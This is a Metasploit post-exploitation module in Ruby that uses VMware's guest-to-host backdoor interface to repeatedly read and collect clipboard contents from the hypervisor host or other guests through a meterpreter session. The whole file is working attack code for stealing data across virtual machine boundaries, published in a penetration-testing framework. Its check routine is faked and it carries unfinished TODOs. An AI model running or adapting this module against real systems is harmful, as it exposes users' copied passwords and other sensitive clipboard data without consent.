##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Vmware

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'VMware Guest/Host Copy Pirate',
      'Description'    => %q{
        Use "backdoor" code in VMware Fusion and Workstation guests to steal the
        copy buffer from the hypervisor's host VMs, or other guests. This module
        works regardless of whether VMware tools is installed on the guests or not.
        Ctl-C the module to terminate collection. TODO: change that behavior.
      },
      'Author'        => ['Abul-Aziz Hariri',            # Discovery & initial PoC
                          'Joshua Smith (kernelsmith)'], # MSF module
      'License'       => MSF_LICENSE,
      'Platform'      => %w| linux osx win |,
      'SessionTypes'  => [ 'meterpreter' ]
    ))
    register_options([
      OptBool.new('ASM_DEBUG', [false, 'Insert int 3 breakpoints at various locations', false]),
      OptInt.new('INTERVAL', [true, 'Time to wait, in seconds, between queries for the copy buffer', 1]),
    ], self.class)
  end

  def check
    # TODO: fake for now, but we should check the C/P & DnD settings or just try it
    Exploit::CheckCode::Appears
  end
  # TODO: possibly integrate with win-meterpreter's clipboard thief:
  # https://github.com/rapid7/metasploit-payloads/blob/master/c/meterpreter/source/extensions/extapi/clipboard.c#L339

  def get_host_selection_length
    ret = send_bd_cmd(BDOOR_CMD_GETSELLENGTH, :ax)
    vprint_status("from get_host_selection_length, send_bd_cmd returned #{ret.class}:#{ret}")
    vprint_status("get_host_selection_length is returning #{ret}")
    ret
  end

  def get_copy_buffer(len)
    ret = send_bd_cmd(BDOOR_CMD_GETNEXTPIECE, :eax, len, String)
    vprint_status("from get_copy_buffer, send_bd_cmd returned #{ret.class}:#{ret}")
    ret
  end

  # TODO: Struct version
  # def send_backdoor(bp)
  #   Backdoor::send_bd_struct!(bp)
  # end

  def run
    # TODO:
    # bp = Vmware::Backdoor::BackdoorProto.new

    @buffers = []
    begin
      while true
        len = get_host_selection_length
        # bp.cmd_msg = BDOOR_CMD_GETSELLENGTH
        # len = send_backdoor(bp)
        if len > 0
          print_good("#{hexify(len)} bytes available in the copy buffer, grabbing")
          # bp.ebx = len
          # buff = send_backdoor(bp)
          buff = get_copy_buffer(len)
          print_good("Pirated (#{buff.to_s})")
          @buffers << buff
        else
          #vprint_status("Nothing available in the copy buffer")
          nil
        end
        sleep 1
      end
    rescue Interrupt
      print_status("Caught keyboard interrupt, shutting down")
      print_line(@buffers.inspect)
    end

    # TODO: fork/background this whole thing or integrate with clipboard thief
    # TODO: Solve memory leak and/or allocate one fixed size chunk of memory and 
    # just reuse it for commands that return only ax (2B)
  end
end # end module
